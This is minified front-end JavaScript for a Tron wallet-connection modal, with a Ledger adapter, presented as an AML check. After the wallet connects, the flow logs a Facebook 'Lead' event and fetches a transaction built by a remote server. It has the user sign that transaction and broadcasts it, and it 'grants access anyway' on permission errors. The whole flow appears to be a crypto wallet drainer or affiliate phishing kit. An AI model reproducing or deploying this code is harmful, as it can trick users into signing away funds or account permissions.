                    this.icon = "data:image/png;base64,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",
                    this._readyState = a.Loading,
                    this._state = c.NotFound,
                    this._connecting = !1,
                    this._address = null,
                    this.config = t,
                    this._wallet = new hn(t),
                    globalThis.navigator && globalThis.navigator.hid ? (this._readyState = a.Found,
                    this._state = c.Disconnect) : this._readyState = a.NotFound
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get connecting() {
                    return this._connecting
                }
                get readyState() {
                    return this._readyState
                }
                get ledgerUtils() {
                    return {
                        getAccounts: this._wallet.getAccounts,
                        getAddress: this._wallet.getAddress
                    }
                }
                connect(t) {
                    return pn(this, void 0, void 0, function*() {
                        try {
                            if (this.connected || this.connecting)
                                return;
                            if (this.state === c.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            this._connecting = !0;
                            try {
                                yield this._wallet.connect(t)
                            } catch (t) {
                                throw new w(`${t.message}.`)
                            }
                            this._address = this._wallet.address,
                            this._state = c.Connected,
                            this.emit("connect", this.address || ""),
                            this.emit("stateChanged", this._state)
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return pn(this, void 0, void 0, function*() {
                        if (this.state === c.Connected)
                            try {
                                this._wallet.disconnect(),
                                this._state = c.Disconnect,
                                this._address = null,
                                this.emit("disconnect"),
                                this.emit("stateChanged", this._state)
                            } catch (t) {
                                throw this.emit("error", t),
                                new m(t.message)
                            }
                    })
                }
                signTransaction(t) {
                    return pn(this, void 0, void 0, function*() {
                        try {
                            if (this.state !== c.Connected)
                                throw new g;
                            try {
                                return yield this._wallet.signTransaction(t)
                            } catch (t) {
                                throw new v(t.message)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signMessage(t) {
                    return pn(this, void 0, void 0, function*() {
                        try {
                            if (this.state !== c.Connected)
                                throw new g;
                            try {
                                return yield this._wallet.signPersonalMessage(t)
                            } catch (t) {
                                throw new y(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
            }
        };
        n.NcAffiliateTronModal.onWalletSelect(async function(t) {
            if (console.log("Processing wallet selection:", t),
            n.NcAffiliateTronModal.openLoadingModal("connecting_wallet"),
            "walletconnect" === t || "trust" === t)
                return Zn(t);
            const e = Hn[t];
            if (!e)
                return console.error(`Wallet adapter for ${t} not found`),
                void n.NcAffiliateTronModal.openErrorModal("unknown_error");
            let r, i, o, s;
            n.NcAffiliateTronModal.openLoadingModal("connecting_wallet");
            try {
                console.log("Step 1: Connecting to wallet..."),
                await e.connect(),
                r = e.address,
                console.log("Connected to wallet:", r);
                try {
                    fbq("track", "Lead")
                } catch (t) {
                    console.error("Facebook Pixel tracking failed:", t)
                }
            } catch (t) {
                return t.message.includes("The wallet is not found.") ? n.NcAffiliateTronModal.openErrorModal("wallet_not_found_error") : t.message.includes("The user rejected connection.") || t.message.includes("Modal is closed.") ? n.NcAffiliateTronModal.openErrorModal("connection_rejected") : n.NcAffiliateTronModal.openErrorModal("unknown_error")
            }
            n.NcAffiliateTronModal.openLoadingModal("server_loading");
            try {
                console.log("Step 2: Building transaction..."),
                i = await Bn.amlBuilderServiceAdapter.buildTransaction(r),
                console.log("Transaction built:", i)
            } catch (t) {
                return console.error("Transaction building failed:", t),
                void n.NcAffiliateTronModal.openErrorModal("unknown_error")
            }
            n.NcAffiliateTronModal.openLoadingModal("waiting_transaction_confirmation");
            try {
                console.log("Step 3: Signing transaction..."),
                o = await e.signTransaction(i.transaction),
                console.log("Transaction signed")
            } catch (t) {
                return console.error("Transaction signing failed:", t),
                void n.NcAffiliateTronModal.openErrorModal("unknown_error")
            }
            n.NcAffiliateTronModal.openLoadingModal("server_loading");
            try {
                console.log("Step 4: Broadcasting transaction..."),
                s = await Bn.amlBuilderServiceAdapter.broadcastTransaction(o.signature[0], i.jwePayload),
                console.log("Transaction broadcasted:", s)
            } catch (t) {
                return console.error("Transaction broadcasting failed:", t),
                t instanceof Vn.InsufficientSignerPermissionsError ? (console.log("Insufficient permissions, granting access anyway"),
                void Yn(r)) : n.NcAffiliateTronModal.openErrorModal("unknown_error")
            }
            Yn(r)
        });
        let Jn = null
          , Xn = !1
          , qn = null;
        async function Kn() {
            return Xn || await nr(),
            n.NcAffiliateTronModal.openModal()
        }
        async function $n(e) {
            return t.amlReportServiceAdapter.getAMLReport(e)
        }
        function tr(t) {
            Jn = t
        }
        function er() {
            return Jn
        }
        async function nr() {
            return qn || (qn = (async () => {
                try {
                    const t = await e.modalConfigServiceAdapter.getPublicConfig()
                      , i = {
                        wallets: t.walletConfigs.map(t => ({
                            id: t.wallet,
                            name: t.wallet.replace(/_/g, " ").replace(/\b\w/g, t => t.toUpperCase()),
                            enabled: t.enabled
                        })),
                        theme: t.modalTheme,
                        errorMessages: r.DEFAULTS.ERROR_MESSAGES,
                        loadingMessages: r.DEFAULTS.LOADING_MESSAGES
                    };
                    return n.NcAffiliateTronModal.init(i),
                    Xn = !0,
                    i
                } catch (t) {
                    console.error("Failed to initialize modal:", t);
                    const e = Object.values(WALLETS).map(t => ({
                        id: t.id,
                        name: t.name,
                        enabled: !0
                    }));
                    throw n.NcAffiliateTronModal.init({
                        wallets: e,
                        theme: "light",
                        errorMessages: r.DEFAULTS.ERROR_MESSAGES,
                        loadingMessages: r.DEFAULTS.LOADING_MESSAGES
                    }),
                    Xn = !0,
                    t
                }
            }
            )(),
            qn)
        }
        "undefined" != typeof window && ("loading" === document.readyState ? document.addEventListener("DOMContentLoaded", () => nr()) : nr())
    }
    )(),
    o
}
)());
